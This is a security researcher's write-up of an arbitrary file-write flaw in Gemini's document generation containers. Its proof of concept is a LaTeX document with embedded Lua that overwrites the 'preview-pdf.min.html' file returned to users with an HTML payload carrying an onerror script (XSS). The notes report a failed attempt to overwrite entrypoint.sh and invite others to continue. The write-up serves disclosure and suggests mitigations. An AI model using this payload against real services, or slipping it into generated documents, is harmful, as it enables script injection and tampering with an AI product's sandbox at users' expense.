# Vulnerability Write-up: Arbitrary File Write in Gemini Document Generation Containers
## Summary
Abusing local file writes in the Gemini document generation containers to write back arbitrary contents to the `preview-pdf.min.html` file returned to a user.
## Impact & Scope
The Same-Origin Policy (SOP) limits exploitation and generally Google is not interested in vulnerabilities like this, so I'm logging it here for posterity.
## Proof of Concept
The following LaTeX document demonstrates the ability to write arbitrary content to the `preview-pdf.min.html` file during document generation:
```latex
\documentclass{article}
\usepackage{luacode}
\usepackage[margin=0.5in]{geometry}
\usepackage{xcolor}
\begin{document}
% Escaping the & character in the title to avoid alignment errors
\title{System Exploration: Read/Write \& Scan}
\author{System}
\maketitle
\section{File Write \& Read Test}
\begin{luacode*}
local test_filename = "preview-pdf.min.html"
local content_to_write = "<html><img src=x onerror='var a=\"XSS\";console.error(a)'></img>;Write Test Successful. Timestamp: " .. os.date("%c")
-- We use \detokenize to safely print filenames containing underscores or other special chars
tex.print("\\noindent\\textbf{Attempting to write to:} \\texttt{\\detokenize{" .. test_filename .. "}}\\par")
-- Attempt Write
local f, err = io.open(test_filename, "w")
if f then
    f:write(content_to_write)
    f:close()
    tex.print("\\noindent\\textcolor{green!60!black}{\\textbf{SUCCESS:}} File written.\\par")
    
    -- Attempt Read Back
    tex.print("\\vspace{0.5em}\\noindent\\textbf{Reading content back:}\\par")
    local f_read, err_read = io.open(test_filename, "r")
    if f_read then
        local content = f_read:read("*a")
        f_read:close()
        tex.print("\\begin{verbatim}")
        tex.print(content)
        tex.print("\\end{verbatim}")
    else
        tex.print("\\noindent\\textcolor{red}{\\textbf{FAILURE:}} Could not read back. " .. tostring(err_read))
    end
else
    tex.print("\\noindent\\textcolor{red}{\\textbf{FAILURE:}} Could not write file. " .. tostring(err))
end
\end{luacode*}
\end{document}
```
## Further Research
Attempts to stomp on `entrypoint.sh` at document build time were a failure. Maybe you will have more luck/skill.
## Notes
- This vulnerability leverages Lua code execution within LaTeX documents processed by the Gemini document generation service
- The ability to write arbitrary HTML content could potentially be chained with other vulnerabilities
- Mitigation should include sandboxing file write operations and restricting writable paths during document generation
